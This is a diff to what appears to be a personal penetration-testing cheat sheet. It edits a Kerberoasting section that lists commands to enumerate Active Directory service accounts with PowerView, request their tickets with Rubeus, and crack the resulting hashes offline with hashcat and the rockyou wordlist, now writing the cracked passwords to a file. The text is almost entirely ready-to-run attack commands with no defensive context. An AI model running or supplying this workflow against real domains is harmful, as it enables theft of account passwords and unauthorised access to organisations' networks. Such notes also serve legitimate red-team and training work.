@@ -1,3 +1,5 @@
+
+hashcat64.exe --help | find "NTLM"
 ### Kerberoasting 
 ```
 PowerShell Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName
@@ -5,7 +7,7 @@ PowerShell Get-DomainUser -SPN -Properties SamAccountName, ServicePrincipalName
 Rubeus kerberoast /outfile:hashes.asreproast
 
 
-hashcat64.exe -a 0 -m 13100 C:\Users\NyaMeeEain\hashes.asreproast C:\Users\NyaMeeEain\Data\rockyou.txt --force  --potfile-disable
+hashcat64.exe -a 0 -m 13100 C:\Users\NyaMeeEain\hashes.asreproast C:\Users\NyaMeeEain\Data\rockyou.txt -o winpass2.txt --force  --potfile-disable
 ```
 
 ### ASREPRoasting
